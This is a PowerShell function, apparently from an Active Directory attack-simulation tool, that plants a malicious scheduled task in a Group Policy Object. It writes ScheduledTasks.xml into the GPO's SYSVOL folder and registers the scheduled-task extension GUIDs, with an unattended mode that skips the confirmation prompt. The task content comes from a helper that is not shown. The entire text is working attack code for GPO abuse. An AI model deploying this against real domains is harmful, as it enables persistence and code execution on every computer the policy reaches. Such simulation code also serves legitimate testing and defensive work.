function Add-GPOScheduleTask {

    ################################################################################
    #####                                                                      ##### 
    #####      Add a malicious scheduled task                                 #####                                 
    #####                                                                      #####
    ################################################################################

    Param(
        [string] $domainDNS,
        [string] $server,
        [string] $ID, 
        [String] $name
    )

    $CurrentFunction = Get-FunctionName
    Write-Log -Message "### Start Function $CurrentFunction ###"
    $StartRunTime = (Get-Date).ToString($Script:DateFormatLog)
    #################### main code | out- host ####################

    If (-not $SkipClearHost) { Clear-Host }

    Invoke-output -Type Header -Message "Add a Malicious Scheduled Task"
    Invoke-Output -Type TextMaker -Message "Affected GPO" -TM "'$name' {$ID}"

    If ($UnAttended) {
        $answer = $Script:Yes 
    }
    else {
        $answer = Show-DecisionPrompt
    }

    If ($answer -eq $Script:Yes) {

        write-host
        #define the target file

        $xmlFilePath = "\\$server\SYSVOL\$domainDNS\Policies\{$ID}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"

        If (!(Test-Path $xmlFilePath)) {

            New-Item -Name "Machine" -ItemType Directory -Path "\\$server\SYSVOL\$domainDNS\Policies\{$ID}" -ErrorAction Ignore | Out-Null
            New-Item -Name "Preferences" -ItemType Directory -Path "\\$server\SYSVOL\$domainDNS\Policies\{$ID}\Machine" -ErrorAction Ignore | Out-Null
            New-Item -Name "ScheduledTasks" -ItemType Directory -Path "\\$server\SYSVOL\$domainDNS\Policies\{$ID}\Machine\Preferences" -ErrorAction Ignore | Out-Null
            
            Write-Log -Message "    >> created path: \\$server\SYSVOL\$domainDNS\Policies\{$ID}\Machine\Preferences\ScheduledTasks\"

            $xml = New-Object XML
            $ScheduledTasksElement = $xml.CreateElement("ScheduledTasks")
            $ScheduledTasksElement.SetAttribute("clsid", "{CC63F200-7309-4ba0-B154-A71CD118DBCC}")
            $xml.AppendChild($ScheduledTasksElement) | Out-Null
            $xml.Save($xmlFilePath)

            Start-Sleep 1
            Add-TaskElementToFileScheduleTaskXml -xmlFilePath $xmlFilePath
        }
        else {
            Write-Log -Message "    >> found file: $xmlFilePath"
            Add-TaskElementToFileScheduleTaskXml -xmlFilePath $xmlFilePath
        }
        
        Set-gPCmachineExtensionNames -GPOGUID $ID -CSEGUID $Script:CSEGUIDScheduledTask -TOOLGUID $ToolGUIDScheduledTask -Server $server
        if (-not $unAttended) { pause }
    
    }
    else {
        Write-Log -Message "    >> Skipped!"
    }
                  
    ######################## main code ############################
    $runtime = Get-RunTime -StartRunTime $StartRunTime
    Write-Log -Message "    Run Time: $runtime [h] ###"
    Write-Log -Message "### End Function $CurrentFunction ###"
}
